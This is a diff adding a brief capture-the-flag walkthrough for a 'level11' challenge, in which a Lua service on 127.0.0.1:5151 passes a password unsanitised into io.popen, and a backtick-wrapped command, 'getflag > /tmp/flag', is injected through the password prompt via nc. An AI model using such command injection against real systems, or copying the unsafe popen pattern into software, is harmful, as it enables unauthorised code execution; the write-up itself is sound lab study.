@@ -1,0 +1,6 @@
+- cat level11.lua
+ -> we see that it is running on 127.0.0.1:5151
+
+- nc 127.0.0.1 5151: asking for a password and we sow that. With a LOT of tests we can execute a function in the pass using prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+- as password set `getflag > /tmp/flag`
